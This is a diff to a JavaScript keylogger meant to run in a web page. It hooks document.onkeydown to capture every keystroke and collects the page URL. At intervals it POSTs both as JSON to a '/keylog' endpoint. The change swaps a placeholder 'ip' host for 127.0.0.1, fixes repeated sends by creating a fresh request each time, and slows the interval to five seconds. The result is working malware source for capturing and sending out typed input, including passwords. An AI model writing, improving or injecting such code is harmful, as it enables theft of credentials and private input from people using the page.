@@ -2,12 +2,12 @@ var keys = '';
 var current = document.URL;
 
 var xhr = new XMLHttpRequest();
-xhr.open("POST", "//ip:8000/keylog", true);
+xhr.open("POST", "http://127.0.0.1:8000/keylog", true);
 xhr.setRequestHeader('Content-Type', 'application/json');
-
-xhr.send(JSON.stringify({
-    logged: '[' + current + ']',
-}));
+const json = {
+    "logged": current,
+};
+xhr.send(JSON.stringify(json));
 
 document.onkeydown = function (e) {
     var get = window.event ? event : e;
@@ -18,9 +18,13 @@ document.onkeydown = function (e) {
 
 window.setInterval(function () {
     if (keys != "") {
-        xhr.send(JSON.stringify({
-            logged: keys
-        }));
+        var xhr_key = new XMLHttpRequest();
+        xhr_key.open("POST", "http://127.0.0.1:8000/keylog", true);
+        xhr_key.setRequestHeader('Content-Type', 'application/json');
+        const json_key = {
+            "logged": keys,
+        };
+        xhr_key.send(JSON.stringify(json_key));
         keys = "";
     }
-}, 1000);
+}, 5000);
